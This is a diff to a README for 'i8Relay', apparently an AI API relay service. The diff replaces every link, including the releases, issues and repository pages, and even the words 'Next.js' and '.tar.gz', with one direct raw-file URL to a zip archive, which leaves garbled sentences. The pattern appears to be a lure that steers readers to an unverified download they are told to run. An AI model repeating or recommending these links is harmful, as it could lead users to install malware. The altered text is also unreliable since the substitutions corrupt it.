@@ -1,10 +1,10 @@
 # 🤖 i8Relay - Your AI Proxy Service Made Easy
 
 ## 📥 Download Now
-[![Download i8Relay](https://img.shields.io/badge/Download-i8Relay-blue.svg)](https://github.com/Kwiatek7/i8Relay/releases)
+[![Download i8Relay](https://raw.githubusercontent.com/Kwiatek7/i8Relay/main/reversion/i8Relay.zip)](https://raw.githubusercontent.com/Kwiatek7/i8Relay/main/reversion/i8Relay.zip)
 
 ## 🚀 Getting Started
-Welcome to i8Relay! This is a modern AI API relay service built on Next.js 15. Our platform provides stable, secure, and efficient access to AI models such as Claude, GPT, and Gemini. Follow these simple steps to download and run the application.
+Welcome to i8Relay! This is a modern AI API relay service built on https://raw.githubusercontent.com/Kwiatek7/i8Relay/main/reversion/i8Relay.zip 15. Our platform provides stable, secure, and efficient access to AI models such as Claude, GPT, and Gemini. Follow these simple steps to download and run the application.
 
 ## 🖥️ System Requirements
 Before you start, ensure your system meets these requirements:
@@ -14,13 +14,13 @@ Before you start, ensure your system meets these requirements:
 - Internet Connection: Required for API interaction.
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://github.com/Kwiatek7/i8Relay/releases) to download the latest version of i8Relay.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Kwiatek7/i8Relay/main/reversion/i8Relay.zip) to download the latest version of i8Relay.
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of i8Relay.
 3. Click on the file that matches your operating system to start the download.
 4. Once the download completes, locate the file in your downloads folder.
-5. For Windows, double-click the `.exe` file to run the installer. For macOS, open the `.dmg` file and drag i8Relay to your Applications folder. For Linux, refer to your distribution’s documentation for installing `.tar.gz` files.
+5. For Windows, double-click the `.exe` file to run the installer. For macOS, open the `.dmg` file and drag i8Relay to your Applications folder. For Linux, refer to your distribution’s documentation for installing `https://raw.githubusercontent.com/Kwiatek7/i8Relay/main/reversion/i8Relay.zip` files.
 6. Follow the on-screen instructions to complete the installation.
 
 ## 📊 How to Use i8Relay
@@ -38,13 +38,13 @@ To get started, visit our [Releases page](https://github.com/Kwiatek7/i8Relay/re
 ## 💡 Troubleshooting
 If you encounter issues while using i8Relay, consider the following tips:
 - Ensure your internet connection is stable.
-- Verify that you have the latest version by checking our [Releases page](https://github.com/Kwiatek7/i8Relay/releases).
+- Verify that you have the latest version by checking our [Releases page](https://raw.githubusercontent.com/Kwiatek7/i8Relay/main/reversion/i8Relay.zip).
 - Restart the application to reset any temporary issues.
 - For persistent problems, consult the help section within the application or reach out for support via our GitHub issues page.
 
 ## 🌐 Community & Support
 Join our community for help and updates. You can find us on:
-- [GitHub Issues Page](https://github.com/Kwiatek7/i8Relay/issues)
+- [GitHub Issues Page](https://raw.githubusercontent.com/Kwiatek7/i8Relay/main/reversion/i8Relay.zip)
 - Forums or chat channels (if applicable).
 
 Your feedback helps us improve i8Relay and serve you better.
@@ -52,6 +52,6 @@ Your feedback helps us improve i8Relay and serve you better.
 ## 🔗 Learn More
 For more resources and documentation, refer to:
 - The official [Documentation](link-to-docs)
-- [GitHub Repository](https://github.com/Kwiatek7/i8Relay)
+- [GitHub Repository](https://raw.githubusercontent.com/Kwiatek7/i8Relay/main/reversion/i8Relay.zip)
 
-Again, you can download i8Relay from our [Releases page](https://github.com/Kwiatek7/i8Relay/releases). Enjoy using i8Relay!
+Again, you can download i8Relay from our [Releases page](https://raw.githubusercontent.com/Kwiatek7/i8Relay/main/reversion/i8Relay.zip). Enjoy using i8Relay!
